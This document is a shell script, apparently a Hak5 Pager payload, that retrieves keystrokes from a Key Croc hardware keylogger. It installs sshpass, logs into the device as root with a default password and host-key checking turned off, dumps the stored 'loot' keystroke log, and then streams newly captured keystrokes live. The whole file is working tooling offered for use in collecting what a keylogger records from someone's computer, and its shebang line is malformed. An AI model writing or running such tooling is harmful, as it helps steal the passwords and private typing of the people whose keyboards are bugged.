#!/usr/bin

# Title:  Pager_keystrokes
# Author: spywill
# Description: Read previous and live keystrokes from your Keycroc
# Version: 1.0

trap 'exit 0' INT TERM
remote_file="/root/loot/croc_char.log"

PROMPT "Title: Pager_keystrokes
Author: spywill
Description: Read previous and live keystrokes from your Keycroc
Version: 1.0

press any button to continue"

# Checking if SSHPASS is installed
if opkg list-installed | grep -q "sshpass"; then
	LOG yellow "Package SSHPASS is already installed."
	LOG ""
else
	ssh_pass=$(CONFIRMATION_DIALOG "Install SSHPASS")
	if [ "$ssh_pass" = "1" ]; then
		LOG "INSTALLING SSHPASS..."
		opkg update
		opkg install sshpass
		LOG "SSHPASS has been installed."
	else
		LOG "Exit"
		exit 1
	fi
fi

croc_ip=$(IP_PICKER "Enter keycroc IP" "croc.lan")

# Checking if key croc is reachability
can_reach() {
	host="$1"
	ping -c 1 -W 1 "$host" >/dev/null 2>&1 && return 0
	nc -z -w 2 "$host" 22 >/dev/null 2>&1
}

if can_reach $croc_ip; then
	LOG yellow "$croc_ip reachable"
	croc_passwd=$(TEXT_PICKER "Enter Key croc password" "hak5croc")
else
	ALERT "$croc_ip unreachable"
	exit 1
fi

resp=$(CONFIRMATION_DIALOG "View live keystrokes")
if [ "$resp" = "1" ]; then
	LOG green "Previous keystrokes (croc_char.log)"
	LOG "$(sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip "cat $remote_file")"
	LOG blue "================================================="
	LOG green "Starting live keystrokes"
	sleep 1
else
	LOG "Exit"
	exit 1
fi

# Get remote file size
size=$(sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
	"stat -c %s '$remote_file' 2>/dev/null || echo 0")

# Start offset at last 10 bytes (never below 0)
offset=$(( size > 10 ? size - 10 : 0 ))

while true; do
	size=$(sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
		"stat -c %s '$remote_file' 2>/dev/null || echo 0")
    # Handle log truncation / rotation
	if (( size < offset )); then
		offset=$size
	fi
	if (( size > offset )); then
		sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
			"dd if='$remote_file' bs=1 skip=$offset count=$((size-offset)) 2>/dev/null" |
		while IFS= read -r -n1 char; do
			LOG "$char"
		done
		offset=$size
	fi
	sleep 0.1
done
